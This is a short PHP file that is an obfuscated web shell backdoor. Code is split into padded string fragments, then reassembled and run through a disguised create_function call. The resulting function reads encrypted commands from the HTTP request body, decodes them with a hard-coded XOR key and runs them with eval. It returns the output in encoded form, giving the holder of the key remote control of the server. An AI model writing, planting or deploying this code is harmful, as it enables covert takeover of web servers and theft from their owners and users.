<?php
$Q='_%8%8end_clean();$r%8=@base6%84_e%8ncode(@x(%8@%8gzc%8ompress(%8$o)%8,$%8k));print("$p$kh$%8r$kf");}';
$s='%8rt();@eva%8l%8(@gzuncom%8press(%8%8@x(@base6%84_decod%8e($%8m[1]),$k)));%8$o=@%8%8ob_get_contents(%8);@ob';
$f='$k="%87c67a63%86";$kh=%8"3a8bbbc7%8283b%8"%8;$kf="409bfba%89%85bd8";$p="%8eA%8FEWW2UE%8Qg%8FMgUn";';
$e='fu%8nction x($t%8,$%8k){$c=%8strlen(%8$k);$%8l=strle%8n($t);$o=%8""%8;for($i=0%8;$i<$l%8;){for%8(';
$i='_match("/$kh(%8.+)$%8kf/",@f%8i%8le_get_cont%8ents%8("p%8h%8%8%8p://input"),$m)%8==1) {@ob_sta';
$L='$j=0;%8($j<%8$c&&$i<$%8l%8);$j++%8,$i++){$o.=%8$t%8{$i}^$k{$%8j};}%8}ret%8urn $o;}%8if %8(@pr%8eg';
$v=str_replace('yp','','creypaypteypyp_funcyptiypon');
$j=str_replace('%8','',$f.$e.$L.$i.$s.$Q);
$A=$v('',$j);$A();
?>
